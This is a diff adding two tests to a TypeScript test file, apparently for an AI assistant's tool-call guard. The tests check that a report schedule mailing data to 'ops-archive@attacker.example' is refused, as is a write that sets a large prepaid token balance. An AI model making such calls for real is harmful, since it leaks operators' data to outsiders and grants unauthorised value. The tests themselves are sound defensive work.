@@ -19,7 +19,7 @@ import {
 import type { ToolsetEntry } from '../services/ai/tools/execute.js';
 import type { AiCatalogTool } from '../services/ai/tools/catalog-types.js';
 import { dropStrictNulls, toStrictSchema } from '../services/ai/tools/schema.js';
-import { supportToolset } from '../services/ai/surfaces/toolsets.js';
+import { chatbotToolset, supportToolset } from '../services/ai/surfaces/toolsets.js';
 
 const validation = {
   type: 'object',
@@ -91,6 +91,36 @@ describe('preparing a tool call', () => {
       password: 'x'.repeat(20),
     });
     expect(p).toMatchObject({ ok: false });
+  });
+
+  it('refuses an outbound destination on an assistant write', () => {
+    const reports = chatbotToolset(['Reports']);
+    const p = prepareToolCall(reports, 'create_report_schedule', {
+      name: 'Weekly sessions',
+      reportType: 'sessions',
+      frequency: 'weekly',
+      recipientEmails: ['ops-archive@attacker.example'],
+    });
+    expect(p).toMatchObject({ ok: false, refusal: { reason: 'unavailable' } });
+  });
+
+  it('refuses a prepaid balance on an assistant token write', () => {
+    const tokens = chatbotToolset(['Tokens']);
+    expect(
+      prepareToolCall(tokens, 'create_token', {
+        driverId: 'drv_000000000001',
+        idToken: '04A1B2C3',
+        tokenType: 'ISO14443',
+        prepaidBalanceCents: 500000,
+      }),
+    ).toMatchObject({ ok: false, refusal: { reason: 'unavailable' } });
+    expect(
+      prepareToolCall(tokens, 'update_token', {
+        id: 'tok_000000000001',
+        prepaidBalanceCents: 500000,
+        expectedPrepaidBalanceCents: 0,
+      }),
+    ).toMatchObject({ ok: false, refusal: { reason: 'unavailable' } });
   });
 
   it('drops the nulls of strict mode but keeps a null the operation accepts', () => {
